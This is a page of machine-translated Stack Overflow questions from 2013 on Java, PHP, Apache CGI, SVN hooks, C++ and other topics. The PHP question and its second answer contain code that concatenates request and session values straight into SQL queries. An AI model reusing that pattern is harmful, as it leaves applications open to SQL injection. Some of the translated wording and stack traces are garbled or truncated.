[INFO] +- javax.jws:jsr181-api:jar:1.0-MR1:compile
[INFO] +- javax.xml.soap:saaj-api:jar:1.3:compile
[INFO] +- com.sun.xml.stream:sjsxp:jar:1.0:compile
[INFO] +- javax.annotation:jsr250-api:jar:1.0:compile
[INFO] \- javax.activation:activation:jar:1.1:compile
[INFO] 
```

在我的 weblogic 应用程序配置中，我提供了以下配置以首先从我的应用程序加载 java。任何人都可以在这个问题上帮助我。在此先感谢您的帮助

```
<?xml version="1.0" encoding="UTF-8"?>
<wls:weblogic-application
xmlns:wls="http://xmlns.oracle.com/weblogic/weblogic-application"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://xmlns.oracle.com/weblogic/weblogic-application http://xmlns.oracle.com/weblogic/weblogic-application/1.0/weblogic-application.xsd http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/javaee_5.xsd">
<!--weblogic-version:10.3.1 -->
<wls:application-param>
<wls:param-name>webapp.encoding.default</wls:param-name>
<wls:param-value>UTF-8</wls:param-value>
</wls:application-param>

<wls:prefer-application-packages>
<wls:package-name>antlr.*</wls:package-name>
</wls:prefer-application-packages>
</wls:weblogic-application> 
```

例外.......

```
SEVERE: Context initialization failed
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'com.sun.xml.ws.transport.http.servlet.SpringBinding#0' defined in ServletContext resourcepring/config/SpringBeans.xml]: Cannot create inner bean '(inner bean)' of type [org.jvnet.jax_ws_commons.spring.SpringService] while setting bean property 'service'; nested exceramework.beans.factory.BeanCreationException: Error creating bean with name '(inner bean)': FactoryBean threw exception on object creation; nested exception is java.lang.Linkageaint violation: when resolving field "DATETIME" the class loader (instance of weblogic/utils/classloaders/ChangeAwareClassLoader) of the referring class, javax/xml/datatype/Datahe class loader (instance of <bootloader>) for the field's resolved type, javax/xml/namespace/QName, have different Class objects for that type
at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveInnerBean(BeanDefinitionValueResolver.java:230)
at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveValueIfNecessary(BeanDefinitionValueResolver.java:122)
at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1245)
at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1010)
at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:472)
at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
at java.security.AccessController.doPrivileged(Native Method)
at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)
at org.springframework.web.context.ContextLoader.createWebApplicationContext(ContextLoader.java:255)
at org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:199)
at org.springframework.web.context.ContextLoaderListener.contextInitialized(ContextLoaderListener.java:45)
at weblogic.servlet.internal.EventsManager$FireContextListenerAction.run(EventsManager.java:481)
at weblogic.security.acl.internal.AuthenticatedSubject.doAs(AuthenticatedSubject.java:321)
at weblogic.security.service.SecurityManager.runAs(SecurityManager.java:120)
at weblogic.servlet.internal.EventsManager.notifyContextCreatedEvent(EventsManager.java:181)
at weblogic.servlet.internal.WebAppServletContext.preloadResources(WebAppServletContext.java:1872)
at weblogic.servlet.internal.WebAppServletContext.start(WebAppServletContext.java:3153)
at weblogic.servlet.internal.WebAppModule.startContexts(WebAppModule.java:1508)
at weblogic.servlet.internal.WebAppModule.start(WebAppModule.java:482)
at weblogic.application.internal.flow.ModuleStateDriver$3.next(ModuleStateDriver.java:425)
at weblogic.application.utils.StateMachineDriver.nextState(StateMachineDriver.java:52)
at weblogic.application.internal.flow.ModuleStateDriver.start(ModuleStateDriver.java:119)
at weblogic.application.internal.flow.ScopedModuleDriver.start(ScopedModuleDriver.java:200)
at weblogic.application.internal.flow.ModuleListenerInvoker.start(ModuleListenerInvoker.java:247)
at weblogic.application.internal.flow.ModuleStateDriver$3.next(ModuleStateDriver.java:425)
at weblogic.application.utils.StateMachineDriver.nextState(StateMachineDriver.java:52)
at weblogic.application.internal.flow.ModuleStateDriver.start(ModuleStateDriver.java:119)
at weblogic.application.internal.flow.StartModulesFlow.activate(StartModulesFlow.java:27)
at weblogic.application.internal.BaseDeployment$2.next(BaseDeployment.java:636)
at weblogic.application.utils.StateMachineDriver.nextState(StateMachineDriver.java:52)
at weblogic.application.internal.BaseDeployment.activate(BaseDeployment.java:205)
at weblogic.application.internal.EarDeployment.activate(EarDeployment.java:58)
at weblogic.application.internal.DeploymentStateChecker.activate(DeploymentStateChecker.java:161)
at weblogic.deploy.internal.targetserver.AppContainerInvoker.activate(AppContainerInvoker.java:79)
at weblogic.deploy.internal.targetserver.operations.AbstractOperation.activate(AbstractOperation.java:569)
at weblogic.deploy.internal.targetserver.operations.ActivateOperation.activateDeployment(ActivateOperation.java:150)
at weblogic.deploy.internal.targetserver.operations.ActivateOperation.doCommit(ActivateOperation.java:116)
at weblogic.deploy.internal.targetserver.operations.AbstractOperation.commit(AbstractOperation.java:323)
at weblogic.deploy.internal.targetserver.DeploymentManager.handleDeploymentCommit(DeploymentManager.java:844)
at weblogic.deploy.internal.targetserver.DeploymentManager.activateDeploymentList(DeploymentManager.java:1253)
at weblogic.deploy.internal.targetserver.DeploymentManager.handleCommit(DeploymentManager.java:440)
at weblogic.deploy.internal.targetserver.DeploymentServiceDispatcher.commit(DeploymentServiceDispatcher.java:163)
at weblogic.deploy.service.internal.targetserver.DeploymentReceiverCallbackDeliverer.doCommitCallback(DeploymentReceiverCallbackDeliverer.java:195)
at weblogic.deploy.service.internal.targetserver.DeploymentReceiverCallbackDeliverer.access$100(DeploymentReceiverCallbackDeliverer.java:13)
at weblogic.deploy.service.internal.targetserver.DeploymentReceiverCallbackDeliverer$2.run(DeploymentReceiverCallbackDeliverer.java:68)
at weblogic.work.SelfTuningWorkManagerImpl$WorkAdapterImpl.run(SelfTuningWorkManagerImpl.java:528)
at weblogic.work.ExecuteThread.execute(ExecuteThread.java:207)
at weblogic.work.ExecuteThread.run(ExecuteThread.java:176)
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name '(inner bean)': FactoryBean threw exception on object creation; nested exceptiogeError: loader constraint violation: when resolving field "DATETIME" the class loader (instance of weblogic/utils/classloaders/ChangeAwareClassLoader) of the referring class, jtatypeConstants, and the class loader (instance of <bootloader>) for the field's resolved type, javax/xml/namespace/QName, have different Class objects for that type 
```

# android - 如何恢复到 SDK 工具 21？

> ID：15998209
> 
> 赞同：0
> 
> 时间：2013-04-14T10:46:09.293
> 
> 标签：android

更新到 21.1 后，我遇到了问题 `java.lang.NoClassDefFoundError: com.actionbarsherlock.R$layout`

我需要恢复到 SDK 20 或 21。我该怎么做？

# c# - 对象 WCF 接收 null

> ID：15998213
> 
> 赞同：-1
> 
> 时间：2013-04-14T10:46:50.980
> 
> 标签：c#, wcf

我有以下对象，它有时会收到 null，但是当它收到 null 时，它会崩溃

> System.ServiceModel.FaultException：对象引用未设置为对象的实例。

有人知道如何解决吗？

```
namespace Objects
{
    using System;
    using System.Runtime.Serialization;

    [DataContract]
    public class ObjectMgmt
    {
        private double? date;

        [DataMember]
        public double? Date
        {
            get
            {
                return this.date;
            }
            set
            {
                this.date = value;
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:03:08.693

故障异常是指服务器在处理请求过程中抛出的异常。您可以调试服务器，也可以向其中添加日志以诊断真正的问题。

# php - 我无法在我的 php 文件中找到错误

> ID：15998222
> 
> 赞同：-1
> 
> 时间：2013-04-14T10:47:51.437
> 
> 标签：php, syntax

你好朋友我没有太多的PHP技能。请帮我处理这段代码。它显示语法错误意外文件结尾。我已经测试过但失败了。当我从文件中删除此代码时，页面显示正确，但当我再次粘贴此代码时，它显示相同的错误。

该文件仅包含此代码，因此可能存在括号、句号或其他问题，请更正它并在您的答案中给出固定代码。爱你们，你们真的在帮助有需要的人。

```
<?php
include("include/header.php");
if (!isset($_SESSION["userlogin"])) {
    header("location: login.php");
    exit();
}
$edit = dbFetchArray(dbQuery("select * from `user_registration` where `email`='" . $_SESSION["userlogin"] . "'"), MYSQL_BOTH);
$Id = base64_decode($_REQUEST['Id']);
$up = mysql_fetch_array(mysql_query("select * from `jobs` where `id`='" . $Id . "'"));
$status = stripslashes($up["highlighted"]);
$name = stripslashes($up["title"]);
$explode = explode(" ", $name);
$tit = isset($explode[0]) ? $explode[0] : '';
$col = isset($explode[1]) ? $explode[1] : '';
$cat = isset($explode[2]) ? $explode[2] : '';

$user = mysql_fetch_array(mysql_query("select * from `user_registration` where `email`='" . $_SESSION["userlogin"] . "'"));
$fullname = stripslashes($user['fullname']);
$customer_id = $user['id'];
$current_balence = $user['current_balance'];

if (isset($_POST["Button"])) {
    if (isset($_REQUEST["Available_positions"])) {
        $Available_positions = $_POST["Available_positions"];
        if (strpos($Available_positions, '.') === false) {
            $pos = $Available_positions;
            $pos1 = 0;
        } else {
            $pieces = explode(".", $Available_positions);
            $pos = $pieces[0];
            $pos1 = $pieces[1];
        }

        $Payment_per_task = $_POST["Payment_per_task"];

        $hid = $_REQUEST['hid'];
        if ($pos1 > 0) {
            ?>
            <script>
                alert('Job Posting Suspended');
                window.location.href="edit_job.php?Id=<?= base64_decode($hid) ?>";
            </script>
            <?
        } else {
            dbQuery("update `jobs` set `wd2`='" . $Available_positions . "',`price`='" . $Payment_per_task . "' where `id`='" . $hid . "' and `email`='" . $_SESSION["userlogin"] . "'");
            ?>
            <script>
                window.location.href="employer.php";
            </script>
            <?
        }
    }
    $_SESSION['hid'] = $hid;
    if ($hid > 0) {
        $_SESSION["success"] = '';
    } else {
        $_SESSION["error"] = '';
    }
} else if (isset($_POST["Cancel"])) {
    $hid = $_REQUEST['hid'];
    dbQuery("update `jobs` set `status`='3' where `id`='" . $hid . "' and `email`='" . $_SESSION["userlogin"] . "'");
    $resJ = dbFetchArray(dbQuery("select * from `jobs` where `id`='" . $hid . "' and `email`='" . $_SESSION["userlogin"] . "'"), MYSQL_BOTH);

    if ($resJ["wd1"] != $resJ["wd2"]) {
        $CJ = $resJ["wd2"] - $resJ["wd1"];
        $CJFees = $CJ * $resJ["price"];
        dbQuery("insert into `myaccount`(`email`,`amount`,`type`,`createdate`,`jobid`) values('" . $_SESSION['userlogin'] . "','$CJFees','10',NOW(),'" . $resJ["id"] . "')");
        $rescurbal = dbFetchArray(dbQuery("select * from `user_registration` where `email`='" . $_SESSION['userlogin'] . "'"), MYSQL_BOTH);
        dbQuery("update `user_registration` set `current_balance`='" . ($rescurbal["current_balance"] + $CJFees) . "' where `email`='" . $_SESSION['userlogin'] . "'");
    }
    ?>
    <script>
        window.location.href="employer.php";
    </script>
    <?
}
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T10:56:12.013

将大块代码一一剪切，刷新页面。如果需要，您可以使用[die](http://pk1.php.net/manual/en/function.die.php)函数停止进一步的脚本执行，以检查脚本是否执行到某个点而不会产生错误。

当错误消失时，这意味着它在您刚刚剪切的块中。然后逐行重复程序，这样你就可以定位错误了。它应该是括号、引号、分号或类似内容的语法错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T10:56:51.623

另外，请确保您的文件编码是 UTF-8，没有 BOM。

```
include ("include/header.php");
if(!isset($_SESSION["userlogin"]))
{
    header("location: login.php");
    exit();
}
$edit = dbFetchArray(dbQuery("select * from `user_registration` where `email`='".$_SESSION["userlogin"]."'"),MYSQL_BOTH);
$Id = base64_decode($_REQUEST['Id']);
$up = mysql_fetch_array(mysql_query("select * from `jobs` where `id`='".$Id."'"));
$status = stripslashes($up["highlighted"]);
$name = stripslashes($up["title"]);
$explode = explode(" ",$name);
$tit = isset($explode[0]) ? $explode[0] : '';
$col = isset($explode[1]) ? $explode[1] : '';
$cat = isset($explode[2]) ? $explode[2] : '';

$user = mysql_fetch_array(mysql_query("select * from `user_registration` where `email`='".$_SESSION["userlogin"]."'"));
$fullname = stripslashes($user['fullname']);
$customer_id = $user['id'];
$current_balence = $user['current_balance'];

if(isset($_POST["Button"]))
{
    if(isset($_REQUEST["Available_positions"]))
    {
        $Available_positions = $_POST["Available_positions"];
        if(strpos($Available_positions,'.') === false)
        {
            $pos = $Available_positions;
            $pos1 = 0;
        }
        else
        {
            $pieces = explode(".",$Available_positions);
            $pos = $pieces[0];
            $pos1 = $pieces[1];
        }

        $Payment_per_task = $_POST["Payment_per_task"];

        $hid = $_REQUEST['hid'];
        if($pos1 > 0)
        {

?>
<script>
alert('Job Posting Suspended');
window.location.href="edit_job.php?Id=<?= base64_decode($hid)?>";
</script>
<?

        }
        else
        {
            dbQuery("update `jobs` set `wd2`='".$Available_positions."',`price`='".$Payment_per_task."' where `id`='".$hid."' and `email`='".$_SESSION["userlogin"]."'");

?>
 <script>
window.location.href="employer.php";
</script>
<?

        }
    }
    $_SESSION['hid'] = $hid;
    if($hid > 0)
    {
        $_SESSION["success"] = '';
    }
    else
    {
        $_SESSION["error"] = '';
    }
}
else
{
    if(isset($_POST["Cancel"]))
    {
        $hid = $_REQUEST['hid'];
        dbQuery("update `jobs` set `status`='3' where `id`='".$hid."' and `email`='".$_SESSION["userlogin"]."'");
        $resJ = dbFetchArray(dbQuery("select * from `jobs` where `id`='".$hid."' and `email`='".$_SESSION["userlogin"]."'"),MYSQL_BOTH);

        if($resJ["wd1"] != $resJ["wd2"])
        {
            $CJ = $resJ["wd2"] - $resJ["wd1"];
            $CJFees = $CJ * $resJ["price"];
            dbQuery("insert into `myaccount`(`email`,`amount`,`type`,`createdate`,`jobid`) values('".$_SESSION['userlogin']."','$CJFees','10',NOW(),'".$resJ["id"]."')");
            $rescurbal = dbFetchArray(dbQuery("select * from `user_registration` where `email`='".$_SESSION['userlogin']."'"),MYSQL_BOTH);
            dbQuery("update `user_registration` set `current_balance`='".($rescurbal["current_balance"] + $CJFees)."' where `email`='".$_SESSION['userlogin']."'");
        }

?>
<script>
window.location.href="employer.php";
</script>
<?
    }
} 
```

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2013-04-14T10:54:06.670

如果您没有激活短标签，则必须使用`<?php`, 因为`<?`. 否则 PHP 会忽略`<? ... ?>`. 因此会缺少括号，因此会出现语法错误，就像您得到的那样。

# jquery-mobile - 三星 Galaxy Note 上的 Jquery 移动网站“迷你”

> ID：15998224
> 
> 赞同：2
> 
> 时间：2013-04-14T10:48:13.760
> 
> 标签：jquery-mobile

我的问题是可折叠块“手风琴”菜单。我最初在网上学习了一个教程，直到我开始应用可折叠块时，我才意识到这个教程已经很老了，我从教程中复制的脚本是：

使用这些脚本，可折叠内容根本无法设置为默认关闭，因此 data-collapsed="true 根本不起作用，菜单默认打开。经过多次谷歌搜索，似乎其他人在升级时也遇到了同样的问题到最新的脚本版本，问题得到了排序，所以当我更新到当前的最新版本时，即：

data-collapsed="true 确实有效，但是现在每个页面在屏幕上都很小。请参阅下面的屏幕截图以了解我的意思。

这里有什么问题，是css问题吗？

> 使用旧脚本我有这个： http: [//www.magnetikmedia.co.uk/m/old_script.png](http://www.magnetikmedia.co.uk/m/old_script.png)

![在此处输入图像描述](https://i.stack.imgur.com/eZDIR.png)

> 使用较新的脚本我有这个： http: [//www.magnetikmedia.co.uk/m/new_script.png](http://www.magnetikmedia.co.uk/m/new_script.png)

![在此处输入图像描述](https://i.stack.imgur.com/nWIBo.png)

我知道 Galaxy note 有一个大屏幕，但使用移动站点模拟器（查看各种手机上的站点）该站点在那里看起来很好（尽管今天早上在 iphone 5 的模拟器上浏览该站点时时不时地，例如，屏幕根据我的屏幕截图缩小，所以某处肯定有错误）从一页头到尾的代码在这里，因为其他页面相同，只是内容不同

```
<head>
<title>Page Title</title>
<link rel="stylesheet" href="mobile.css" />
<link rel="stylesheet" href="http://code.jquery.com/mobile/1.3.1/jquery.mobile-1.3.1.min.css" />
<script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
<script src="http://code.jquery.com/mobile/1.3.1/jquery.mobile-1.3.1.min.js"></script>

</head>

<body>

<!-- Start of first page -->
<div data-role="page" id="home">

<div data-role="header1">
<div align="center"><img src="http://www.magnetikmedia.co.uk/m/images/magnetikmedia_header.png" width="90%"></div>
</div>
<div>
<div align="center"><img src="http://www.magnetikmedia.co.uk/m/images/welcome_banner.png" width="100%"></div>
</div><!-- /header -->

<div data-role="content">   
    <ul data-role="listview">
<li data-role="list-divider"><h3 align="center">Digital Design & Development</h3></li>

<li><a href="#about">
<div class="mobile_menu_hpage"></div>
  <div class="list-text">About Us</div>
</a></li>

<li><a href="#getsocial">
  <div class="mobile_menu_hpag"></div>
  <div class="list-text">Get Social</div>
</a></li>

<li><a href="#services">
  <div class="mobile_menu_hpag"></div>
  <div class="list-text">Services</div>
</a></li>

<li><a href="http://www.magnetikmedia.co.uk/portfolio.htm">
  <div class="mobile_menu_hpag"></div>
  <div class="list-text">Portfolio</div>
</a></li>

   <li><a href="http://www.magnetikmedia.co.uk/contact.htm">
  <div class="mobile_menu_hpag"></div>
  <div class="list-text">Contact Us</div>
</a></li>
</ul>   
</div><!-- /content -->

  <div id="footer1">
<div id="footer_left">
<div align="center"><a href="http://www.facebook.com/magnetikmedia"><img src="http://www.magnetikmedia.co.uk/m/images/fbook_foot.png" width="30" height="30" style="margin-right:10px;" ></a><a href="http://www.twitter.com/magnetikmedia"><img src="http://www.magnetikmedia.co.uk/m/images/twitter_foot.png" width="30" height="30" style="margin-right:10px;" ></a><a href="http://magnetikmedia.blogspot.co.uk"><img src="http://www.magnetikmedia.co.uk/m/images/blogger_foot.png" width="30" height="30" style="margin-right:10px;" ></a><a href="http://www.linkedin.com/in/magnetikmedia"><img src="http://www.magnetikmedia.co.uk/m/images/linkedin_foot.png" width="113" height="30" style="margin-right:10px;" ></a></div>
</div>
<div style="clear:both;"></div>
</div>
</div>
  <div align="center"><!-- /footer -->

  </div>
</div><!-- /page --> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T18:47:58.010

添加`viewport`元标记如下。

```
<meta name="viewport" content="width=device-width, initial-scale=1"> 
```

# windows-7 - 403 禁止的 CGI 脚本

> ID：15998235
> 
> 赞同：1
> 
> 时间：2013-04-14T10:49:52.677
> 
> 标签：windows-7, apache2, cgi

我正在尝试在我的服务器上执行 .cgi 文件，但返回以下错误

```
403 Forbidden
You don't have permission to access /run/test.cgi on this server.
Apache/2.0.64 (Win32) Server at localhost Port 80 
```

服务器配置：

*   Windows 7的
*   阿帕奇 2
*   主动式perl

我尝试了各种解决方案，但都没有奏效

将 /run/test.cgi 的权限设置为可读和可执行 > 不工作

试图改变选项索引>不工作

```
<Directory "E:/Apache/Apache2/htdocs">
#    Options Indexes FollowSymLinks Includes ExecCGI
Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
AllowOverride None
Order allow,deny
Allow from all
</Directory> 
```

我的目录在“E:/Apache/Apache2/htdocs/run/test.cgi”下

剧本：

```
#!/usr/bin/perl
print "Content-type: text/plain\n\n";
print "testing...\n";
use CGI;
use CGI::Carp 'fatalsToBrowser';
#print qq`Perl_version: $]\n`;
#print qq`CGI::VERSION: $CGI::VERSION\n`;
foreach my $var (sort keys %ENV)
{
#   print "$var: $ENV{$var}\n";
}
#print "\nExecuting 'which convert':\n";
#print "\n";
#print "\nExecuting 'find / -name convert':\n";
#print `find / -name convert`; 
```

谁能帮忙？谢谢

# javascript - Javascript 显示更多/显示更少的速度效果

> ID：15998238
> 
> 赞同：1
> 
> 时间：2013-04-14T10:50:28.597
> 
> 标签：javascript, performance, toggle, hide, show

我有这个 javascript 代码：

```
<script language="javascript" type="text/javascript">
function showHide(shID) {
   if (document.getElementById(shID)) {
      if (document.getElementById(shID+'-show').style.display != 'none') {
         document.getElementById(shID+'-show').style.display = 'none';
         document.getElementById(shID).style.display = 'block';
      }
      else {
         document.getElementById(shID+'-show').style.display = 'inline';
         document.getElementById(shID).style.display = 'none';
      }
   }
}
</script> 
```

可以为显示和隐藏添加切换速度效果吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:11:05.190

为您的代码添加效果将导致您为浏览器兼容性添加更多代码行。我建议你使用[jQuery](http://jquery.com)，它将为你节省大量的开发和测试时间。

# svn - 如何使用提交通知将作者添加到 SVN 中的提交后

> ID：15998240
> 
> 赞同：1
> 
> 时间：2013-04-14T10:51:16.923
> 
> 标签：svn, visualsvn-server, post-commit

我在 post-commit 钩子中使用 commit-notification 命令，它工作正常，但电子邮件不包含提交的作者。这是我的脚本：

```
"<visualsvnpath>\bin\VisualSVNServerHooks.exe" ^
commit-notification "%1" -r %2 ^
--from myemail.com --to anothermail.com ^
--smtp-server smtpserver ^
--smtp-port 25 ^
--smtp-user someone@company.com ^
--smtp-password password 
```

有没有办法在邮件通知中添加作者？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T15:28:25.253

使用 VisualSVNServerHooks.exe 发送的电子邮件通知在“发件人：”字段中指定提交者的用户名。

例如，如果提交者的帐户用户名是 John.Doe，并且您从 noreply@domain.com 发送通知，则收到的通知的“发件人：”将如下所示：

`John.Doe <noreply@domain.com>`.

# c++ - 使用 Boost 的经过时间（以秒为单位）

> ID：15998243
> 
> 赞同：2
> 
> 时间：2013-04-14T10:51:44.380
> 
> 标签：c++, boost

我通常在以下时间播种我的 RNG，通过调用获得`time.h`

```
#include <iostream>
#include <time.h>

using namespace std;

int main()
{
    cout << static_cast<unsigned int>(time(0)) << endl;
    return 0;
} 
```

`static_cast<unsigned int>(time(0))`在 Boost 库中是否有等价物？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T10:54:45.267

您可以使用`boost::posix_time`. 请参阅这个[SO 问题](https://stackoverflow.com/questions/6734375/c-boost-get-current-time-in-milliseconds)。前任：

```
boost::posix_time::time_duration diff = tick - now;
diff.total_milliseconds(); 
```

如果可以使用C++11，也可以使用 C [++11 chrono](http://en.cppreference.com/w/cpp/chrono)。前任：

```
int elapsed_milliseconds = std::chrono::duration_cast<std::chrono::milliseconds>(end-start).count(); 
```

使用这两种方法，您可以获得从一天开始的毫秒数，然后将其分配给您的种子。

# erlang - 更新 mnesia 模式的最简单方法是什么？

> ID：15998244
> 
> 赞同：7
> 
> 时间：2013-04-14T10:51:44.680
> 
> 标签：erlang, mnesia

例如，我保存`{id, name}`在 mnesia 并想更新到，每次更改架构时`{id, name, age}`都必须调用吗？`transform_table`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-12-23T13:08:20.690

最简单的方法是删除表并重新创建它。如果您需要将数据保留在表中，[`mnesia:transform_table`](https://erldocs.com/current/mnesia/mnesia.html)是要走的路。

# objective-c - 将五个字符串传递给objective-c xcode中的方法

> ID：15998250
> 
> 赞同：2
> 
> 时间：2013-04-14T10:52:53.890
> 
> 标签：objective-c, nsstring

我只是在考虑一个编程设计问题：

比如说，我将 5 个字符串从一个类传递到另一个类。它们是详细信息，例如：主机名主机域用户子域用户名密码

哪个更好？1\. 将它们作为 NSString 对象数组传递或 2\. 重新定义被调用的方法以接受 5 个不同的 NSString 参数？

哪种方法更有效？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-14T10:56:11.943

您错过了第三种方法 - 传递包含五个字段的自定义对象：

```
@interface HostDef // Pick a good name that fits well the purpose of your method.
@property (nonatomic, readwrite) NSString* hostName;
@property (nonatomic, readwrite) NSString* hostDomain;
@property (nonatomic, readwrite) NSString* userSubdomain;
...
@end 
```

这是最具描述性和可扩展性的方法：如果您需要扩展传入的项目列表，则更改`HostDef`, 而方法的签名保持不变。

如果在可预见的将来参数的数量可能保持为五个，那么具有五个单独参数的方法同样好。具体来说，如果参数的数量对应于世界上基本的东西或算法中不会改变的东西，那么带有单个参数的方法是一个不错的选择。例如，如果您的方法将二叉树的左子树和右子树作为其输入，则有两个参数是合适的，因为二叉树不能获得更多或更少的参数而不成为二叉树以外的东西。

传递未命名对象的普通数组是最不可读的选择，也是最难维护的。除非所有对象对程序具有相同的“意义”，否则不应将它们放入同一个数组中。例如，将主机域和用户子域放在同一个数组中是一种误导程序读者的快捷方式，从而大大增加了维护的复杂性。

# windows - 如何以编程方式安装同一打印机驱动程序的第二个实例

> ID：15998255
> 
> 赞同：2
> 
> 时间：2013-04-14T10:53:46.977
> 
> 标签：windows, installation, driver, printers

我需要在 Windows XP 和 Windows 7 下拥有具有不同属性的同一驱动程序的两个版本。需要以编程方式安装它，最后必须在任何应用程序的打印机选择中列出两个打印机驱动程序。两个驱动程序都应该使用具有不同属性的相同驱动程序。

例如。第一台打印机是“HP Document Printer”，第二台是“HP Document Printer 2nd”

第一台打印机将使用一组设置打印，第二台打印机将使用另一组设置打印到文件。

# c# - C# 的 Matlab exprnd(a,b,c) 模拟？

> ID：15998258
> 
> 赞同：3
> 
> 时间：2013-04-14T10:53:55.267
> 
> 标签：c#, matlab

如何从与 Matlab 中的函数 exprnd() 相同的分布中获取 C# 中的数字？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T13:32:14.827

尝试类似：

```
static readonly Random randomNumberGenerator = new Random();

public static double ExpRnd(double mu)
{
    return -Math.Log(randomNumberGenerator.NextDouble()) * mu;
} 
```

如果你想要`m`×`n`矩阵，使用

```
public static double[,] ExpRnd(double mu, int m, int n)
{
    var arr = new double[m, n];
    for (int i = 0; i < m; ++i)
    {
        for (int j = 0; j < n; ++j)
            arr[i, j] = ExpRnd(mu);
    }
    return arr;
} 
```

注意：`System.Random`该类*不是*线程安全的。如果`ExpRnd`上面调用的线程不止一个，那就要多加小心了。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-14T13:36:19.910

这篇博文可能会对您有所帮助：

[http://ericlippert.com/2012/02/21/generating-random-non-uniform-data/](http://ericlippert.com/2012/02/21/generating-random-non-uniform-data/)

如果您知道 - 或可以计算出 - 您想要的分布的*分位数函数*，那么您可以将您已经拥有的（大致）均匀分布转换为给定分布。

正如我在博客文章中所描述的，分位数函数是累积分布的倒数，而累积分布是分布下的面积。由于您想要的分布是 e ^(-x)，因此应该很容易计算出积分和倒数。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-14T11:51:11.857

您可以使用一些外部信号处理库，例如[meta.numerics](http://www.meta-numerics.net/Documentation/index.html)

在`Meta.Numerics.Statistics.Distributions`命名空间下，查看`ExponentialDistribution`类和相应的`GetRandomValue(Random)`方法。

# c++ - if 语句中的函数：错误预期表达式

> ID：15998259
> 
> 赞同：0
> 
> 时间：2013-04-14T10:53:55.703
> 
> 标签：c++, c, compilation, compiler-errors, syntax-error

我想编译以下文件：

[https://gist.github.com/bodokaiser/5382281](https://gist.github.com/bodokaiser/5382281)

没有成功，因为我收到以下错误：

```
 CXX(target) Release/obj.target/parser/src/parser/parser.o
In file included from ../src/parser/parser.cc:2:
../src/parser/calc_head_size.cc:67:16: error: expected expression
    if (mask || isMasking(masking)) {
               ^
1 error generated.
make: *** [Release/obj.target/parser/src/parser/parser.o] Error 1 
```

这对我来说没有意义。会不会有其他问题？

博多

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-14T10:55:46.230

您的源代码中似乎有一个奇怪的字符，看起来像一个空格，但不是。在这一行：

```
if (mask || isMasking(masking)) {
//         ^ here 
```

尝试删除“空间”并添加一个真实的空间。

# java - Android 在动态行创建中的 IllegalStateException

> ID：15998261
> 
> 赞同：0
> 
> 时间：2013-04-14T10:54:07.397
> 
> 标签：java, android, exception, android-tablelayout

[我在这里](https://stackoverflow.com/questions/5183968/how-to-add-rows-dynamically-into-table-layout)跟着这个家伙，最终得到了以下错误。据我了解，我不需要运行 new `TableLayout()`，也不需要 new`Textview()`在运行时运行。

```
04-14 16:11:55.232: E/AndroidRuntime(24014): java.lang.RuntimeException: Unable to start activity ComponentInfo{org.opencv.samples.fd/org.opencv.samples.fd.StatsActivity}: java.lang.IllegalStateException: The specified child already has a parent. You must call removeView() on the child's parent first.
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2100)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2125)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.app.ActivityThread.access$600(ActivityThread.java:140)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1227)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.os.Handler.dispatchMessage(Handler.java:99)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.os.Looper.loop(Looper.java:137)
04-14 16:11:55.232: E/AndroidRuntime(24014):    at android.app.ActivityThread.main(ActivityThread.java:4898)
